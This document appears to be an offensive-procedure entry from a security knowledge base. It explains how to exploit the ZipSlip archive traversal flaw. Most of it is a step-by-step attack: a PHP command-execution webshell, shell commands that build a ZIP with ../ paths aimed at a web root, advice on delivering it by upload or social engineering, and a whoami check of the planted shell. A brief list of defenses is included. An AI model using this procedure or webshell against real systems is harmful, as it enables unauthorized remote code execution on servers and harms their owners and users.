---
type: procedure
verified: true
submitted: true
tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[User Execution]]'
sub_techniques: []
tags:
  - known-vulnerability
commands:
  - '[[commands/mkdir-create-zipslip-dirs]]'
  - '[[commands/echo-write-php-shell]]'
  - '[[commands/zip-create-traversal-zip]]'
platforms:
  - Linux
  - Windows
tools: []
validated: true
---

# ZipSlip-Directory-Traversal-with-File-Overwrite

## Summary

This procedure exploits the ZipSlip vulnerability by crafting a malicious ZIP archive that uses directory traversal to write a PHP webshell outside the intended extraction directory, such as overwriting files in a web server's root. It demonstrates how attackers can leverage path traversal in ZIP extraction libraries to achieve remote code execution upon extraction by a vulnerable application or user.

## Description

ZipSlip is a directory traversal vulnerability affecting ZIP extraction processes in various software libraries and applications. ZIP files store file paths as relative strings, which, if not properly sanitized during extraction, allow attackers to specify paths like "../../../etc/passwd" to write files to arbitrary locations on the filesystem, provided the extraction process has sufficient permissions. This procedure focuses on creating a ZIP that deploys a simple PHP command execution shell to /var/www/html/shell.php, enabling remote command execution via HTTP requests. It is commonly used against public-facing applications that handle file uploads or extractions without path validation, such as content management systems or file-sharing services. The technique requires the target to extract the ZIP in a context where traversal can reach sensitive directories, and success depends on the extractor's implementation (e.g., vulnerable Java, Python, or PHP libraries like Apache Commons Compress or zipfile module).

## Requirements

1. Attacker machine with ZIP utility installed (standard on Linux/Windows).
2. Knowledge of the target's extraction directory and desired write location (e.g., web root).
3. Sufficient traversal depth to reach the target path from the extraction point.
4. Delivery mechanism to the target (e.g., file upload, email, or drive-by download) that triggers extraction.
5. Target application or user must use a vulnerable ZIP extractor without path normalization.

## Defense

Defensive measures and detection strategies:

- Implement path normalization and validation in all ZIP extraction code to block ".." traversals and absolute paths.
- Use secure libraries like Python's zipfile with strict extraction modes or Java's ZipInputStream with security managers.
- Monitor file creation events in sensitive directories (e.g., web roots) via filesystem auditing tools like auditd on Linux.
- Scan uploaded archives for suspicious paths using tools like zip-slip-scanner before extraction.
- Employ web application firewalls (WAFs) to detect anomalous file uploads containing traversal patterns.

## Objectives

1. Create a PHP webshell payload for command execution.
2. Simulate the target directory structure locally to build the malicious ZIP.
3. Generate a ZIP archive with traversal paths to place the payload in the target's web root.
4. Deliver and trigger extraction on the target to achieve code execution.

## Instructions

### Step 1: Prepare the PHP Webshell Payload

**Context**: Define the payload code that will be embedded in the ZIP. This simple PHP script executes system commands received via HTTP requests, providing a basic webshell interface.

Reference the payload in [[codes/PHP-Request-CMD-System-Webshell]]. The code is:

```php
<?php system($_REQUEST["cmd"]); ?>
```

> This step ensures the payload is ready for inclusion. No execution is needed here; it will be written during ZIP creation simulation.

### Step 2: Create Directory Structure for ZIP Simulation

**Context**: Set up a local directory hierarchy to mimic the extraction context. This includes a deep nested path for the ZIP's root and a simulated target path prefixed with /tmp/ to avoid actual system writes during testing.

**Command** ([[commands/mkdir-create-zipslip-dirs]]):
```bash
mkdir -p $_DEEP_PATH && mkdir -p $_TARGET_SIM_PATH/
```

> Run this to create the necessary folders. For example, set $_DEEP_PATH to /tmp/1/2/3/4 and $_TARGET_SIM_PATH to /tmp/var/www/html. Expected output: No errors; directories created silently if they don't exist.

### Step 3: Write the Payload to the Simulated Target Directory

**Context**: Place the PHP webshell in the simulated target path within the local filesystem. This file will be referenced in the ZIP with a traversal path.

**Command** ([[commands/echo-write-php-shell]]):
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > $_TARGET_SIM_PATH/shell.php
```

> Substitute $_TARGET_SIM_PATH with the path from Step 2 (e.g., /tmp/var/www/html). Expected output: The file shell.php is created with the PHP code. Verify with ls $_TARGET_SIM_PATH/shell.php.

### Step 4: Create the Malicious ZIP Archive with Traversal

**Context**: From the deep directory, create a ZIP that references the payload using ".." traversal to escape to the actual target location upon extraction. This tricks the extractor into writing outside the current directory.

**Command** ([[commands/zip-create-traversal-zip]]):
```bash
cd $_DEEP_PATH && zip $_ZIP_NAME $_TRAVERSAL_PATH/shell.php
```

> Set $_DEEP_PATH to /tmp/1/2/3/4, $_ZIP_NAME to pwn.zip, and $_TRAVERSAL_PATH to ../../../var/www/html (adjust depth as needed, e.g., more ../ for deeper traversals). Expected output: ZIP file created with adding: $_TRAVERSAL_PATH/shell.php. The archive contains the file with the traversal path intact.

### Step 5: Deliver and Trigger Extraction

**Context**: Transfer the ZIP to the target and induce extraction. This could be via file upload to a vulnerable web app, social engineering, or automated processing.

No specific command; use tools like scp, curl for upload, or email. Once extracted by the target:

> Expected output: The shell.php appears in the real target directory (e.g., /var/www/html/shell.php). Verify by accessing http://target/shell.php?cmd=whoami; success shows command output instead of 404.

If traversal fails, increase depth (e.g., ../../../../) or check extractor permissions.
